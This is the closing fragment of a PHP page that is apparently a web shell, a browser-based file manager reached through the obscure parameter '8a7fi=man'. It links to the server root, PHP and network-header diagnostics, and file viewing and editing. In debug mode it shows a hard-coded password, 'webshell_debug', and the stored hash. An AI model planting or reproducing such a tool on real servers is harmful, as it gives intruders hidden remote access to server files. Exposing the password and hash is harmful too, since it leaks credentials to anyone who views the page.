            <li>Processed Path: <?php echo htmlspecialchars($_SESSION['navigation_debug']['processed_path']); ?></li>
            <li>Is Absolute Path: <?php echo htmlspecialchars($_SESSION['navigation_debug']['is_absolute']); ?></li>
            <li>System Path: <?php echo htmlspecialchars($_SESSION['navigation_debug']['full_system_path']); ?></li>
            <li>Script Directory: <?php echo htmlspecialchars($_SESSION['navigation_debug']['script_directory']); ?></li>
            <li>Parent Path: <?php echo htmlspecialchars($_SESSION['navigation_debug']['parent_path']); ?></li>
            <li>Show Parent Link: <?php echo htmlspecialchars($_SESSION['navigation_debug']['show_parent_link']); ?></li>
            <li>Items in Directory: <?php echo (int)$_SESSION['navigation_debug']['item_count']; ?></li>
        </ul>
    </div>
    <?php endif; ?>
    
    <div class="tools">
        <h3>Diagnostic Tools</h3>
        <ul>
            <li><a href="?8a7fi=man&diagnostics=1">Show PHP Diagnostics</a> - Display PHP configuration and environment information</li>
            <li><a href="?8a7fi=man&ip_debug=1">IP Address Debug</a> - Debug IP detection and show all network headers</li>
            <li><a href="?8a7fi=man&debug=1">Debug Mode</a> - Show PHP errors and warnings</li>
            <li><a href="?8a7fi=man&path=<?php echo urlencode('/'); ?>">Go to Server Root</a> - Navigate to server root directory</li>
            <?php if ($show_parent_link): ?>
            <li><a href="<?php echo build_url($parent_path); ?>">Go Up One Level</a> - Navigate to parent directory</li>
            <?php endif; ?>
            <li><a href="?8a7fi=man&logout=1">Logout</a> - End the current session</li>
            <?php if($show_php_files): ?>
            <li><a href="?8a7fi=man&path=<?php echo urlencode($current_path); ?>&hide_php=1">Hide PHP Files</a> - Hide PHP files in directory listings</li>
            <?php else: ?>
            <li><a href="?8a7fi=man&path=<?php echo urlencode($current_path); ?>&show_php=1">Show PHP Files</a> - Show PHP files in directory listings</li>
            <?php endif; ?>
        </ul>
        
        <h4>File Size Limits (Memory Protection)</h4>
        <ul>
            <li><strong>Max Viewable:</strong> <?php echo format_size(MAX_VIEWABLE_FILE_SIZE); ?> - Files larger than this will be truncated when viewed</li>
            <li><strong>Max Editable:</strong> <?php echo format_size(MAX_EDITABLE_FILE_SIZE); ?> - Files larger than this cannot be edited to prevent memory issues</li>
            <li><strong>Current Memory:</strong> <?php $mem = get_memory_info(); echo format_size($mem['current']) . ' / ' . format_size($mem['limit_bytes']); ?></li>
        </ul>
        
        <?php if($debug_login): ?>
        <div style="margin-top:15px;padding:8px;background:#ffffd0;border:1px solid #e0e0a0;border-radius:4px;">
            <p><strong>Debug Mode Active</strong></p>
            <p>Debug password: <code>webshell_debug</code></p>
            <p>Stored hash: <code><?php echo htmlspecialchars($stored_hash); ?></code></p>
            <p>PHP Version: <?php echo phpversion(); ?></p>
            <p>Using <?php echo function_exists('password_verify') ? 'modern password_verify()' : 'secure SHA-256 salted hash fallback'; ?></p>
        </div>
        <?php endif; ?>
    </div>

    <script type="text/javascript">
        function toggleAllFiles() {
            var checkboxes = document.getElementsByClassName('file-checkbox');
            var selectAllCheckbox = document.getElementById('select-all');
            
            for (var i = 0; i < checkboxes.length; i++) {
                checkboxes[i].checked = selectAllCheckbox.checked;
            }
        }
    </script>
</body>
</html>